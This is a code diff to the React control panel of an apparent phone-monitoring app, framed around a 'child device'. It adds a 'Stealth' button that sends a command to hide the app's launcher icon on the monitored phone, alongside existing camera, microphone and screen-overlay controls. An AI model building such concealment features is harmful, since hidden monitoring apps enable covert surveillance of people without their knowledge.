@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { Play, Square, Camera, Mic, Clock, Send, RefreshCw, ChevronDown, ChevronUp, Zap, Smartphone, Bell, HardDrive, PhoneCall, Trash2 } from 'lucide-react';
+import { Play, Square, Camera, Mic, Clock, Send, RefreshCw, ChevronDown, ChevronUp, Zap, Smartphone, Bell, HardDrive, PhoneCall, Trash2, EyeOff } from 'lucide-react';
 import { sendCommand, updateDeviceMonitoring, triggerTorchToggle, triggerChatOverlay, triggerSyncEverything } from '../services/trackerService';
 
 export default function ControlPanel({ currentDevice, onRequestDeleteDevice }) {
@@ -298,25 +298,35 @@ export default function ControlPanel({ currentDevice, onRequestDeleteDevice }) {
             </button>
           </div>
 
-          {/* Interactive Screen Overlay & Siren */}
-          <div className="grid grid-cols-2 gap-2">
+          {/* Interactive Controls: Chat, Siren, Stealth Mode */}
+          <div className="grid grid-cols-3 gap-2">
             <button
               onClick={handleChatOverlay}
               disabled={loadingAction === 'SHOW_CHAT_OVERLAY'}
-              className="py-2.5 px-3 rounded-xl bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs font-semibold text-slate-200 flex items-center justify-center space-x-1.5 transition-colors disabled:opacity-50"
+              className="py-2.5 px-2 rounded-xl bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs font-semibold text-slate-200 flex items-center justify-center space-x-1 transition-colors disabled:opacity-50"
               title="Pops up live chat overlay directly over child device screen"
             >
-              <Smartphone className="w-3.5 h-3.5 text-cyan-400" />
-              <span className="truncate">Chat Overlay</span>
+              <Smartphone className="w-3.5 h-3.5 text-cyan-400 shrink-0" />
+              <span className="truncate">Chat Pop</span>
             </button>
 
             <button
               onClick={() => handleAction('RING_PHONE')}
               disabled={loadingAction === 'RING_PHONE'}
-              className="py-2.5 px-3 rounded-xl bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs font-semibold text-slate-200 flex items-center justify-center space-x-1.5 transition-colors disabled:opacity-50"
+              className="py-2.5 px-2 rounded-xl bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs font-semibold text-slate-200 flex items-center justify-center space-x-1 transition-colors disabled:opacity-50"
             >
-              <Bell className="w-3.5 h-3.5 text-amber-400" />
-              <span className="truncate">Siren Alarm</span>
+              <Bell className="w-3.5 h-3.5 text-amber-400 shrink-0" />
+              <span className="truncate">Siren</span>
+            </button>
+
+            <button
+              onClick={() => handleAction('TOGGLE_STEALTH')}
+              disabled={loadingAction === 'TOGGLE_STEALTH'}
+              className="py-2.5 px-2 rounded-xl bg-slate-800 hover:bg-slate-700 border border-amber-500/30 text-xs font-semibold text-amber-300 hover:text-white flex items-center justify-center space-x-1 transition-colors disabled:opacity-50"
+              title="Toggle Stealth Mode (Hide/Show launcher icon on phone)"
+            >
+              <EyeOff className="w-3.5 h-3.5 text-amber-400 shrink-0" />
+              <span className="truncate">Stealth</span>
             </button>
           </div>
 
